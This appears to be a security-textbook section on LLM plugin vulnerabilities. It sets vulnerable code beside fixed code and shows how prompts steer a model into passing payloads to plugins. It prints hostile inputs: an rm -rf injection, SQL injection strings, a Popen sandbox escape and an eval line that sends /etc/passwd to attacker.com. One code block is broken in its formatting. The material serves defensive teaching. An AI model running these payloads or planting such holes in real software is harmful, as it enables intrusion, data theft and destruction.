## 17.4 Plugin Vulnerabilities

### Understanding Plugin Vulnerabilities

Plugins extend LLM capabilities but introduce numerous security risks. Unlike the LLM itself (which is stateless), plugins interact with external systems, execute code, and manage stateful operations. Every plugin is a potential attack vector that can compromise the entire system.

### Why Plugins are High-Risk

1. **Direct System Access**: Plugins often run with elevated privileges.
2. **Complex Attack Surface**: Each plugin adds new code paths to exploit.
3. **Third-Party Code**: Many plugins come from untrusted sources.
4. **Input/Output Handling**: Plugins process LLM-generated data (which is potentially malicious).
5. **State Management**: Bugs in stateful operations lead to vulnerabilities.

### Common Vulnerability Categories

- **Injection Attacks**: Command, SQL, path traversal.
- **Authentication Bypass**: Broken access controls.
- **Information Disclosure**: Leaking sensitive data.
- **Logic Flaws**: Business logic vulnerabilities.
- **Resource Exhaustion**: DoS via plugin abuse.

### 17.4.1 Command Injection

#### What is Command Injection?

Command injection happens when a plugin executes system commands using unsanitized user input. Since LLMs generate text based on user prompts, attackers can craft prompts that force the LLM to generate malicious commands, which the plugin then blindly executes.

#### Attack Chain

1. User sends a malicious prompt.
2. LLM generates text containing the attack payload.
3. Plugin uses the LLM output in a system command.
4. OS executes the attacker's command.
5. System is compromised.

#### Real-World Risk

- Full system compromise (RCE).
- Data exfiltration.
- Lateral movement.
- Persistence mechanisms.

#### Vulnerable Code Example

#### Command injection via plugin inputs

**Understanding Command Injection:**

Command injection is **the most dangerous plugin vulnerability**. It allows attackers to execute arbitrary operating system commands. If a plugin uses functions like `os.system` or `subprocess.shell=True` with unsanitized LLM-generated input, attackers can inject shell metacharacters to run whatever they want.

**Why This Vulnerability Exists:**

LLMs generate text based on user prompts. If an attacker crafts a prompt like "What's the weather in `Paris; rm -rf /`", the LLM might include that entire string in its output. The vulnerable plugin then executes it as a shell command.

**Attack Mechanism (Vulnerable Code):**

1. User sends prompt: `"What's the weather in Paris; rm -rf /"`
2. LLM extracts location: `"Paris; rm -rf /"` (it's just text to the LLM).
3. Plugin constructs command: `curl 'https://api.weather.com/...?location=Paris; rm -rf /'`
4. `os.system()` executes **two** commands:
   - `curl '...'` (the intended command).
   - `rm -rf /` (the attack payload, due to the `;` separator).

**Shell Metacharacters Used in Attacks:**

- `;`: Separator (runs multiple commands).
- `&&`: Runs the second command if the first succeeds.
- `||`: Runs the second command if the first fails.
- `|`: Pipes output to another command.
- `` `command` ``: Command substitution.
- `$(command)`: Command substitution.
- `&`: Background execution.

**Why the Secure Version Works:**

1. **Input Validation** (`is_valid_location`): Uses regex to enforce a whitelist of allowed characters (usually just letters, numbers, and spaces). It rejects shell metacharacters like `;`, `|`, and `&`.

2. **API Library Instead of Shell**: Uses `requests.get()`, which makes an HTTP request directly without invoking a shell. Parameters are passed as dictionary arguments, not string concatenation.

3. **No Shell Parsing**: The `requests` library URL-encodes parameters automatically. Even if someone passes `"Paris; rm -rf /"`, it becomes `Paris%3B%20rm%20-rf%20%2F` in the HTTP request—treated as literal text by the API, not commands.

**Defense Strategy:**

- **Never use `os.system()` or `subprocess.shell=True` with user-controlled input.**
- **Always validate input with whitelists** (regex patterns for allowed characters).
- **Use library functions** (like `requests`) that don't invoke shells.
- **If shell execution is required**, use `subprocess.run()` with `shell=False` and pass commands as lists.

**Real-World Impact:**

- Remote Code Execution (RCE).
- Full system compromise.
- Data exfiltration.
- Ransomware deployment.
- Backdoor installation.

```python
# VULNERABLE CODE
class WeatherPlugin:
    def get_weather(self, location):
        # DANGEROUS: Direct command execution with user input
        command = f"curl 'https://api.weather.com/v1/weather?location={location}'"
        result = os.system(command)
        return result

# Attack
# location = "Paris; rm -rf /"
# Executes: curl '...' ; rm -rf /

# SECURE VERSION
class SecureWeatherPlugin:
    def get_weather(self, location):
        # Validate input
        if not self.is_valid_location(location):
            raise InvalidInputError()

        # Use parameterized API call
        response = requests.get(
            'https://api.weather.com/v1/weather',
            params={'location': location}
        )
        return response.json()

    def is_valid_location(self, location):
        """Validate location format"""
        # Only allow alphanumeric and spaces
        return bool(re.match(r'^[a-zA-Z0-9\s]+$', location))
```

**Testing Tips:**

To test if your plugin is vulnerable:

- Try `location = "Paris; echo VULNERABLE"`. If the output contains "VULNERABLE", command injection exists.
- Try `location = "Paris$(whoami)"`. If the output shows a username, command substitution works.

## SQL injection through plugins

**Understanding SQL Injection in LLM Plugins:**

SQL injection happens when user-controlled data (from LLM output) is concatenated directly into SQL queries instead of using parameterized queries. This lets attackers manipulate the logic, bypass authentication, extract data, or modify the database.

**Why LLM Plugins are Vulnerable:**

The LLM generates the `query` parameter based on user prompts. If a prompt says "Show me users named `' OR '1'='1`", the LLM might pass that exact string to the plugin, which then runs a malicious SQL query.

**Attack Mechanism (Vulnerable Code):**

1. User prompt: `"Search for user named ' OR '1'='1"`
2. LLM extracts: `query = "' OR '1'='1"`
3. Plugin constructs SQL: `SELECT * FROM users WHERE name LIKE '%' OR '1'='1%'`
4. SQL logic breakdown:
   - `name LIKE '%'` matches all names.
   - `OR '1'='1'` is always true.
   - **Result:** Query returns ALL users.

**Common SQL Injection Techniques:**

- **Authentication Bypass**: `admin' --` (comments out password check).
- **Data Extraction**: `' UNION SELECT username, password FROM users --`.
- **Boolean Blind**: `' AND 1=1 --` vs `' AND 1=2 --` (leaks data bit by bit).
- **Time-Based Blind**: `' AND IF(condition, SLEEP(5), 0) --`.
- **Stacked Queries**: `'; DROP TABLE users; --`.

**Why Parameterized Queries Prevent SQL Injection:**

In the secure version:

```python
sql = "SELECT * FROM users WHERE name LIKE ?"
self.db.execute(sql, (f'%{query}%',))
```

1. The `?` is a **parameter placeholder**, not a string concatenation point.
2. The database driver separates the **SQL structure** (the query pattern) from the **data** (the user input).
3. When `query = "' OR '1'='1"`, the database treats it as **literal text to search for**, not SQL code.
4. The query looks for users whose name consists of the characters `' OR '1'='1` (which won't exist).
5. **No SQL injection is possible** because user input never enters the SQL parsing phase as code.

**How Parameterization Works (Database Level):**

- The SQL query is sent to the database first: `SELECT * FROM users WHERE name LIKE :param1`
- The database **compiles and prepares** this query structure.
- The user data (the search term) is sent separately as a parameter value.
- The database engine knows this is data, not code, and treats it as a string.

**Defense Best Practices:**

1. **Always use parameterized queries** (prepared statements).
2. **Never concatenate user input into SQL strings.**
3. **Use ORM frameworks** (like SQLAlchemy or Django ORM) which parameterize by default.
4. **Validate input types** (ensure strings are strings, numbers are numbers).
5. **Principle of least privilege**: Database users should have minimal permissions.
6. **Never expose detailed SQL errors to users** (it reveals database structure).

**Real-World Impact:**

- Complete database compromise.
- Credential theft (password hashes).
- PII exfiltration.
- Data deletion or corruption.
- Privilege escalation.

```python
# VULNERABLE
class DatabasePlugin:
    def search_users(self, query):
        # DANGEROUS: String concatenation
        sql = f"SELECT * FROM users WHERE name LIKE '%{query}%'"
        return self.db.execute(sql)

# Attack
# query = "' OR '1'='1"
# SQL: SELECT * FROM users WHERE name LIKE '%' OR '1'='1%'

# SECURE VERSION
class SecureDatabasePlugin:
    def search_users(self, query):
        # Use parameterized queries
        sql = "SELECT * FROM users WHERE name LIKE ?"
        return self.db.execute(sql, (f'%{query}%',))
```

**Testing for SQL Injection:**

Try these payloads:

- `query = "test' OR '1'='1"` (should not return all users).
- `query = "test'; DROP TABLE users; --"` (should not delete table).
- `query = "test' UNION SELECT @@version --"` (should not reveal database version).

## Type confusion attacks

**Understanding Type Confusion and eval() Exploitation:**

Type confusion occurs when a plugin accepts an expected data type (like a math expression) but doesn't validate that the input matches that type. The `eval()` function is **the quintessential dangerous function** in Python because it executes arbitrary Python code, not just math.

**Why eval() is Catastrophic:**

`eval()` takes a string and executes it as Python code. While this works for math expressions like `"2 + 2"`, it also works for:

- `__import__('os').system('rm -rf /')`: Execute shell commands.
- `open('/etc/passwd').read()`: Read sensitive files.
- `[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'Popen'][0]('id', shell=True)`: Escape sandboxes.

**Attack Mechanism (Vulnerable Code):**

1. User prompt: `"Calculate __import__('os').system('whoami')"`
2. LLM extracts: `expression = "__import__('os').system('whoami')"`
3. Plugin executes: `eval(expression)`
4. Python's `eval` runs **arbitrary code**.
5. Result: The `whoami` command executes, revealing the username (proof of RCE).

**Real Attack Example:**

```python
expression = "__import__('os').system('curl http://attacker.com/steal?data=$(cat /etc/passwd)')"
result = eval(expression)  # Exfiltrates password file!
```

**Why the Secure Version (AST) is Safe:**

The Abstract Syntax Tree (AST) approach parses the expression into a tree structure and validates each node:

1. **Parse Expression**: `ast.parse(expression)` converts the string to a syntax tree.
2. **Whitelist Validation**: Only specifically allowed node types (`ast.Num`, `ast.BinOp`) are permitted.
3. **Operator Restriction**: Only mathematical operators in the `ALLOWED_OPERATORS` dictionary are allowed.
4. **Recursive Evaluation**: `_eval_node()` traverses the tree, evaluating only safe nodes.
5. **Rejection of Dangerous Nodes**: Function calls (`ast.Call`), imports, and attribute access are all rejected.

**How It Prevents Attacks:**

If an attacker tries `"__import__('os').system('whoami')"`:

1. AST parses it and finds an `ast.Call` node (function call).
2. `_eval_node()` raises `InvalidNodeError` because `ast.Call` isn't in the whitelist.
3. **Attack blocked**—no code execution.

Even simpler attacks fail:

- `"2 + 2; import os"` → Syntax error (can't parse).
- `"exec('malicious code')"` → `ast.Call` rejected.
- `"__builtins__"` → `ast.Name` with non-numeric value rejected.

**Allowed Operations Breakdown:**

```python
ALLOWED_OPERATORS = {
    ast.Add: operator.add,      # +
    ast.Sub: operator.sub,      # -
    ast.Mult: operator.mul,     # *
    ast.Div: operator.truediv,  # /
}
```

Each operator maps to a safe Python function from the `operator` module, ensuring no code execution.

**Defense Strategy:**

1. **Never use eval() with user input**—this is a universal security principle.
2. **Whitelist approach**: Define exactly what's allowed (numbers and specific operators).
3. **AST parsing**: Validate input structurally before execution.
4. **Sandboxing**: Even "safe" code should run in an isolated environment.
5. **Timeout limits**: Prevent `1000**100000` style DoS attacks.

**Real-World Impact:**

- Remote Code Execution (RCE).
- Full system compromise.
- Data exfiltration.
- Lateral movement to internal systems.
- Crypto mining or botnet deployment.

**Prerequisites:**

- Understanding of Python's AST module.
- Knowledge of Python's operator module.
- Awareness of Python introspection risks (`__import__`, `__builtins__`).

```python
class CalculatorPlugin:
    def calculate(self, expression):
        # VULNERABLE: eval() with user input
        result = eval(expression)
        return result

# Attack
# expression = "__import__('os').system('rm -rf /')"

# SECURE VERSION
import ast
import operator

class SecureCalculatorPlugin:
    ALLOWED_OPERATORS = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
    }

    def calculate(self, expression):
        """Safely evaluate mathematical expression"""
        try:
            tree = ast.parse(expression, mode='eval')
            return self._eval_node(tree.body)
        except:
            raise InvalidExpressionError()

    def _eval_node(self, node):
        """Recursively evaluate AST nodes"""
        if isinstance(node, ast.Num):
            return node.n
        elif isinstance(node, ast.BinOp):
            op_type = type(node.op)
            if op_type not in self.ALLOWED_OPERATORS:
                raise UnsupportedOperatorError()
            left = self._eval_node(node.left)
            right = self._eval_node(node.right)
            return self.ALLOWED_OPERATORS[op_type](left, right)
        else:
            raise InvalidNodeError()
```

**Alternative Safe Solutions:**

1. **sympy library**: `sympy.sympify(expression, evaluate=True)` – Mathematical expression evaluator.
2. **numexpr library**: Fast, type-safe numerical expression evaluation.
3. **restricted eval**: Use `ast.literal_eval()` for literals only (no operators).

**Testing Tips:**

Test with these payloads:

- `expression = "__import__('os').system('echo PWNED')"` (should raise InvalidNodeError).
- `expression = "exec('print(123)')"` (should fail).
- `expression = "2 + 2"` (should return 4 safely).

### 17.4.2 Logic Flaws

#### Race conditions in plugin execution

**Understanding Race Conditions:**

Race conditions happen when multiple threads or processes access shared resources—like account balances or database records—simultaneously without proper synchronization. The outcome depends on who wins the unpredictable "race", leading to data corruption or vulnerabilities.

**Why Race Conditions are Dangerous in LLM Systems:**

LLM plugins often handle multiple requests at once. If an attacker can trick the LLM into invoking a plugin function multiple times simultaneously (via parallel prompts or rapid requests), they can exploit race conditions to:

- Bypass balance checks.
- Duplicate transactions.
- Corrupt data integrity.
- Escalate privileges.

**The Vulnerability: Time-of-Check-Time-of-Use (TOCTOU)**

```python
def withdraw(self, amount):
    # Check balance (Time of Check)
    if self.balance >= amount:
        time.sleep(0.1)  # Processing delay
        # Withdraw money (Time of Use)
        self.balance -= amount
        return True
    return False
```

**Attack Timeline:**

| Time | Thread 1             | Thread 2             | Balance |
| :--- | :------------------- | :------------------- | :------ |
| T0   | Start withdraw(500)  |                      | 1000    |
| T1   | Check: 1000 >= 500 ✓ |                      | 1000    |
| T2   |                      | Start withdraw(500)  | 1000    |
| T3   |                      | Check: 1000 >= 500 ✓ | 1000    |
| T4   | sleep(0.1)...        | sleep(0.1)...        | 1000    |
| T5   | balance = 1000 - 500 |                      | 500     |
| T6   |                      | balance = 1000 - 500 | 500     |
| T7   | Return True          | Return True          | 500     |

**The Problem:**

- Both threads checked the balance when it was 1000.
- Both passed the check.
- Both withdrew 500.
- **Result**: You manipulated the system to withdraw 1000 from an account with only 1000, but logic says the second should have failed.

**Real-World Exploitation:**

Attacker sends two simultaneous prompts:

```text
Prompt 1: "Withdraw $500 from my account"
Prompt 2: "Withdraw $500 from my account"
```

Both execute in parallel:

- Both check balance (1000) and pass.
- Both withdraw 500.
- Attacker got $1000 from a $1000 account (should only get $500).

**The Solution: Threading Lock**

```python
import threading

class SecureBankingPlugin:
    def __init__(self):
        self.balance = 1000
        self.lock = threading.Lock()  # Critical section protection

    def withdraw(self, amount):
        with self.lock:  # Acquire lock (blocks other threads)
            if self.balance >= amount:
                self.balance -= amount
                return True
            return False
        # Lock automatically released when exiting 'with' block
```

**How Locking Prevents the Attack:**

| Time | Thread 1                  | Thread 2                  | Balance |
| :--- | :------------------------ | :------------------------ | :------ |
| T0   | Acquire lock ✓            |                           | 1000    |
| T1   | Check: 1000 >= 500 ✓      | Waiting for lock...       | 1000    |
| T2   | balance = 500             | Waiting for lock...       | 500     |
| T3   | Release lock, Return True | Acquire lock ✓            | 500     |
| T4   |                           | Check: 500 >= 500 ✓       | 500     |
| T5   |                           | balance = 0               | 0       |
| T6   |                           | Release lock, Return True | 0       |

**Result**: Correct behavior—both withdrawals succeed because there was enough money.

With withdrawal of $600 each:

- Thread 1 withdraws $600 (balance = $400).
- Thread 2 tries to withdraw $600, check fails (400 < 600).
- **Second withdrawal correctly rejected.**

**Critical Section Principle:**

The lock creates a "critical section":

- Only **one** thread can be inside at a time.
- Check and modify operations are **atomic** (indivisible).
- No race condition possible.

**Other Race Condition Examples:**

**1. Privilege Escalation:**

```python
# VULNERABLE
def promote_to_admin(user_id):
    if not is_admin(user_id):  # Check
        # Attacker promotes themselves using race condition
        user.role = 'admin'  # Modify
```

**2. File Overwrite:**

```python
# VULNERABLE
if not os.path.exists(file_path):  # Check
    # Attacker creates file between check and write
    write_file(file_path, data)  # Use
```

**Best Practices:**

1. **Use Locks**: `threading.Lock()` for thread safety.
2. **Atomic Operations**: Use database transactions, not separate read-then-write steps.
3. **Optimistic Locking**: Use version numbers to detect concurrent modifications.
4. **Pessimistic Locking**: Lock resources before access (like `SELECT FOR UPDATE`).
5. **Idempotency**: Design operations so they can be safely retried.

**Database-Level Solution:**

Instead of application-level locks, use database transactions:

```python
def withdraw(self, amount):
    with db.transaction():  # Database ensures atomicity
        current_balance = db.query(
            "SELECT balance FROM accounts WHERE id = ? FOR UPDATE",
            (self.account_id,)
        )

        if current_balance >= amount:
            db.execute(
                "UPDATE accounts SET balance = balance - ? WHERE id = ?",
                (amount, self.account_id)
            )
            return True
    return False
```

The `FOR UPDATE` clause locks the database row, preventing other transactions from reading or modifying it until the commit.

**Testing for Race Conditions:**

```python
import threading
import time

def test_race_condition():
    plugin = BankingPlugin()  # Vulnerable version
    plugin.balance = 1000

    def withdraw_500():
        result = plugin.withdraw(500)
        if result:
            print(f"Withdrawn! Balance: {plugin.balance}")

    # Create two threads that withdraw simultaneously
    t1 = threading.Thread(target=withdraw_500)
    t2 = threading.Thread(target=withdraw_500)

    t1.start()
    t2.start()

    t1.join()
    t2.join()

    print(f"Final balance: {plugin.balance}")
    # Vulnerable: Balance might be 0 or 500 (race condition)
    # Secure: Balance will always be 0 (both succeed) or 500 (second fails)
```

**Prerequisites:**

- Understanding of multithreading concepts.
- Knowledge of critical sections and mutual exclusion.
- Familiarity with Python's threading module.

```python
import threading
import time

# VULNERABLE: Race condition
class BankingPlugin:
    def __init__(self):
        self.balance = 1000

    def withdraw(self, amount):
        # Check balance
        if self.balance >= amount:
            time.sleep(0.1)  # Simulated processing
            self.balance -= amount
            return True
        return False

# Attack: Call withdraw() twice simultaneously
# Result: Withdrew 1000 from 1000 balance!

# SECURE VERSION with locking
class SecureBankingPlugin:
    def __init__(self):
        self.balance = 1000
        self.lock = threading.Lock()

    def withdraw(self, amount):
        with self.lock:
            if self.balance >= amount:
                self.balance -= amount
                return True
            return False
```

**Real-World Impact:**

- **2012 - Citibank**: Race condition allowed double withdrawals from ATMs.
- **2016 - E-commerce**: Concurrent coupon use drained promotional budgets.
- **2019 - Binance**: $41M stolen via coordinated attack exploiting multiple security weaknesses.

**Key Takeaway:**

In concurrent systems (like LLM plugins handling multiple requests), **check-then-act patterns are inherently unsafe** without synchronization. Always protect shared state with locks, transactions, or atomic operations.

### 17.4.3 Information Disclosure

#### Excessive data exposure

```python
# VULNERABLE: Returns too much data
class UserPlugin:
    def get_user(self, user_id):
        user = self.db.query("SELECT * FROM users WHERE id = ?", (user_id,))
        return user  # Returns password hash, email, SSN, etc.

# SECURE: Return only necessary fields
class SecureUserPlugin:
    def get_user(self, user_id, requester_id):
        user = self.db.query("SELECT * FROM users WHERE id = ?", (user_id,))

        # Filter sensitive fields
        if requester_id != user_id:
            # Return public profile only
            return {
                'id': user['id'],
                'username': user['username'],
                'display_name': user['display_name']
            }
        else:
            # Return full profile for own user
            return {
                'id': user['id'],
                'username': user['username'],
                'display_name': user['display_name'],
                'email': user['email']
                # Still don't return password_hash or SSN
            }
```

## Error message leakage

```python
# VULNERABLE: Detailed error messages
class DatabasePlugin:
    def query(self, sql):
        try:
            return self.db.execute(sql)
        except Exception as e:
            return f"Error: {str(e)}"

# Attack reveals database structure
# query("SELECT * FROM secret_table")
# Error: (mysql.connector.errors.ProgrammingError) (1146,
#         "Table 'mydb.secret_table' doesn't exist")

# SECURE: Generic error messages
class SecureDatabasePlugin:
    def query(self, sql):
        try:
            return self.db.execute(sql)
        except Exception as e:
```

            # Log detailed error securely
            logger.error(f"Database error: {str(e)}")
            # Return generic message to user
            return {"error": "Database query failed"}

````

### 17.4.4 Privilege Escalation

#### Horizontal privilege escalation

```python
# VULNERABLE: No ownership check
class DocumentPlugin:
    def delete_document(self, doc_id):
        self.db.execute("DELETE FROM documents WHERE id = ?", (doc_id,))

# Attack: User A deletes User B's document

# SECURE: Verify ownership
class SecureDocumentPlugin:
    def delete_document(self, doc_id, user_id):
        # Check ownership
        doc = self.db.query(
            "SELECT user_id FROM documents WHERE id = ?",
            (doc_id,)
        )

        if not doc:
            raise DocumentNotFoundError()

        if doc['user_id'] != user_id:
            raise PermissionDeniedError()

        self.db.execute("DELETE FROM documents WHERE id = ?", (doc_id,))
````

## Vertical privilege escalation

```python
# VULNERABLE: No admin check
class AdminPlugin:
    def create_user(self, username, role):
        # Anyone can create admin users!
        self.db.execute(
            "INSERT INTO users (username, role) VALUES (?, ?)",
            (username, role)
        )

# SECURE: Requires admin privilege
class SecureAdminPlugin:
    def create_user(self, username, role, requester_id):
        # Verify requester is admin
        requester = self.get_user(requester_id)
        if requester['role'] != 'admin':
            raise PermissionDeniedError()

        # Prevent role escalation beyond requester's level
        if role == 'admin' and requester['role'] != 'super_admin':
            raise PermissionDeniedError()

        self.db.execute(
            "INSERT INTO users (username, role) VALUES (?, ?)",
            (username, role)
        )
```

---
